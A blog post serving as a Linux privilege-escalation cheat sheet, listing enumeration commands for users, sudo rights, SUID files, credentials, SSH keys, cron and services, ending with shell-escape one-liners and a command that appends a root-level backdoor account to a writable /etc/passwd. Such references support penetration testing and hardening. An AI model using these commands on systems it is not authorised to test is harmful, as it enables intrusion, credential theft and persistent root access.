---
layout: post
title: 'Linux Privilege Escalation Commands'
date: '2022-04-11'
description: 'To exploit systems, attackers utilise a technique known as enumeration to find flaws that could lead to privilege escalation. Privilege Escalation is where a user can get elevated access to resources that should typically be unavailable by exploiting a bug, design flaw, or configuration issue. The attacker can utilise the newly acquired access to steal sensitive information, run administrative commands, or deploy malware. This article looks at enumeration for privilege escalation of Linux.'
coverimage: Linux_Privilege_Escalation_Commands.jpg
tags: enumeration linux priv-esc
published: true
posttype: article
categories: article
---

# Linux Enumeration

Privilege escalation happens when one user acquires the system rights of another user. While not a direct exploit, enumeration is vital for finding ways of exploitation.

## Kernel, Operating System & Device Information

Print all available system information

```
uname -a
```

Kernel release

```
uname -r
```

System hostname

```
uname -n
```

As above

```
hostname
```

Linux kernel architecture (32 or 64 bit)

```
uname -m
```

Kernel information

```
cat /proc/version
```

Distribution information

```
cat /etc/*-release
```

Distribution information

```
cat /etc/issue
```

CPU information

```
cat /proc/cpuinfo
```

File system information

```
df -a
```

## Users & Groups

List all users on the system

```
cat /etc/passwd
```

As above

```
getent passwd
```

List all groups on the system

```
cat /etc/group
```

List all uids and respective group memberships

```
for i in $(cat /etc/passwd 2>/dev/null| cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null
```

Show user hashes - Privileged command

```
cat /etc/shadow
```

List all superuser accounts

```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
```

Users currently logged in

```
finger
```

Users currently logged in

```
pinky
```

Users currently logged in

```
users
```

Users currently logged in

```
who -a
```

Who is currently logged in, and what they’re doing

```
w
```

Listing of last logged on users

```
last
```

Information on when all users last logged in

```
lastlog
```

Information on when the specified user last logged in

```
lastlog -u %username%
```

Entire list of previously logged on users

```
lastlog |grep -v "Never"
```

## User & Privilege Information

Current username

```
whoami
```

Current user information

```
id
```

Who’s allowed to do what as root - Privileged command

```
cat /etc/sudoers
```

Can the current user perform anything as root

```
sudo -l
```

Can the current user run any â€˜interesting’ binaries as root and if so also display the binary permissions etc.

```
sudo -l 2>/dev/null | grep -w 'nmap|perl|'awk'|'find'|'bash'|'sh'|'man'|'more'|'less'|'vi'|'vim'|'nc'|'netcat'|python|ruby|lua|irb' | xargs -r ls -la 2>/dev/null
```

## Environmental Information

Display environmental variables

```
env
```

Set a run-time parameter

```
set
```

Path information

```
echo $PATH.
```

Displays command history of current user

```
history
```

Print working directory

```
pwd
```

Display default system variables

```
cat /etc/profile
```

Display available shells

```
cat /etc/shells
```

## Interesting Files

### setuid Permission

When set-user identification (setuid) permission is set on an executable file, a process that runs this file is granted access based on the owner of the file (this is usually root), rather than the user who is running the executable file. This special permission allows a user to access files and directories that are normally only available to the owner. For example, the setuid permission on the `passwd` command makes it possible for a user to change passwords, assuming the permissions of the root ID:

### setgid Permission

The set-group identification (setgid) permission is similar to setuid, except that the process’s effective group ID (GID) is changed to the group owner of the file, and a user is granted access based on permissions granted to that group. The `/usr/bin/mail` command has setgid permissions:

When setgid permission is applied to a directory, files that were created in this directory belong to the group to which the directory belongs, not the group to which the creating process belongs. Any user who has write and execute permissions in the directory can create a file there. However, the file belongs to the group that owns the directory, not to the user’s group ownership.

### Sticky Bit

The sticky bit is a permission bit that protects the files within a directory. If the directory has the sticky bit set, a file can be deleted only by the owner of the file, the owner of the directory, or by root. This special permission prevents a user from deleting other users’ files from public directories such as `/tmp`:

Example

```
find directory -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename
```

Breakdown

```
find directory = Checks all mounted paths starting at the specified directory, which can be root (/), sys, bin, or mail.
-user root = Displays files owned only by root.
-perm -4000 = Displays files only with permissions set to 4000.
-exec ls -ldb = Displays the output of the find command in ls -ldb format.
>/tmp/filename = Writes results to this file.
```

Find SUID files

```
find / -perm -4000 -type f 2>/dev/null
```

Find SUID files owned by the root user

```
find / -uid 0 -perm -4000 -type f 2> /dev/null
```

Or we can specify the user name instead of their user-id

```
find / -user root -perm -4000 -type f 2> /dev/null
```

Find GUID files

```
find / -perm -2000 -type f 2>/dev/null
```

Find world-writable files

```
find / -perm -2 -type f 2>/dev/null
```

Find world-writable files, excluding those in /proc

```
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

Find word-writeable directories

```
find / -perm -2 -type d 2>/dev/null
```

Find rhost config files

```
find /home -name *.rhosts -print 2>/dev/null
```

Find `*.plan` files, list permissions and cat the file contents

```
find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null ;
```

Find `hosts.equiv`, list permissions and cat the file contents

```
find /etc -iname hosts.equiv -exec ls -la {} \; 2>/dev/null ; -exec cat {} 2>/dev/null ;
```

See if you can access other user directories to find interesting files

```
ls -ahlR /root/
```

Show the current users’ command history

```
cat ~/.bash_history
```

Show the current users’ various history files

```
ls -la ~/.*_history
```

Can we read root’s history files

```
ls -la /root/.*_history
```

Check for interesting ssh files in the current users’ directory

```
ls -la ~/.ssh/
```

Find SSH keys/host information

```
find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null | xargs -r ls -la
```

Check Configuration of inetd services

```
ls -la /usr/sbin/in.*
```

Check log files for keywords (â€˜pass’ in this example) and show positive matches

```
grep -l -i pass /var/log/*.log 2>/dev/null
```

List files in specified directory (/var/log)

```
find /var/log -type f -exec ls -la {} ; 2>/dev/null
```

List .log files in specified directory (/var/log)

```
find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null
```

List .conf files in /etc (recursive 1 level)

```
find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null
```

As above

```
ls -la /etc/*.conf
```

Find .conf files (recursive 4 levels) and output line number where the word â€˜password’ is located

```
find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null
```

List open files (output will depend on account privileges)

```
lsof -i -n
```

Can we read roots mail

```
head /var/mail/root
```

## Service Information

View services running as root

```
ps aux | grep root
```

Lookup process binary path and permissions

```
ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'
```

List services managed by inetd

```
cat /etc/inetd.conf
```

As above for xinetd

```
cat /etc/xinetd.conf
```

A very 'rough' command to extract associated binaries from `xinetd.conf` and show permissions of each

```
cat /etc/xinetd.conf 2>/dev/null | awk '{print $7}' |xargs -r.. ls -la 2>/dev/null
```

Permissions and contents of /etc/exports (NFS)

```
ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null
```

## Jobs/Tasks

Display scheduled jobs for the specified user (or all users) - Privileged command

```
crontab -l -u <username>
crontab -l
```

Scheduled jobs overview (hourly, daily, monthly etc)

```
ls -la /etc/cron*
```

What can â€˜others’ write in /etc/cron* directories

```
ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null
```

List of current tasks

```
top
```

## Networking, Routing & Communications

List all network interfaces

```
/sbin/ifconfig -a
```

Show described interfaces

```
cat /etc/network/interfaces
```

Display ARP communications

```
arp -a
```

Display route information

```
route
```

Show configured DNS sever addresses

```
cat /etc/resolv.conf
```

List all TCP sockets and related PIDs (-p Privileged command)

```
netstat -antp
```

List all UDP sockets and related PIDs (-p Privileged command)

```
netstat -anup
```

List rules - Privileged command

```
iptables -L
```

View port numbers/services mappings

```
cat /etc/services
```

View the static lookup for hostnames on the current system or network

```
cat /etc/hosts
```

Listen to traffic with `tcpdump`

```
tcpdump -i eth0 -w capture.log
```

## Programs Installed

Installed packages (Debian)

```
dpkg -l
```

Installed packages (Red Hat)

```
rpm -qa
```

Apache version

```
httpd -v
```

Apache version

```
apache2 -v
```

List loaded Apache modules

```
apachectl -M
apache2ctl -M
```

Installed MYSQL version details

```
mysql --version
```

Installed Postgres version details

```
psql -V
```

Installed Perl version details

```
perl -v
```

Installed Java version details

```
java -version
```

Installed Python version details

```
python --version
```

Installed Ruby version details

```
ruby -v
```

Locate useful programs (i.e. nc, netcat, wget, nmap etc)

```
find / -name "<program name" 2>/dev/null
```

As above i.e. nc, netcat, wget, nmap etc

```
which %program_name%
```

Locate programs

```
locate %program_name%
```

List available compilers

```
dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null
```

Which account is Apache running as

```
cat /etc/apache2/envvars 2>/dev/null |grep -Ei 'user|group' |awk '{sub(/.*export /,"")}1'
```

## Common Shell Escape Sequences

vi, vim

```
:!bash
```

vi, vim

```
:set shell=/bin/bash:shell
```

man, more, less

```
!bash
```

find

```
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
```

awk

```
awk 'BEGIN {system("/bin/bash")}'
```

nmap

```
--interactive
```

nmap

```
echo "os.execute('/bin/sh')" > exploit.nse
sudo nmap --script=exploit.nse
```

Perl

```
perl -e 'exec "/bin/bash";'
```

## Misc

Writable /etc/passwd

```
echo "evilsaint::0:0:root:/root:/bin/bash" >> /etc/passwd
echo "evilsaint:p4assword" | chpasswd
```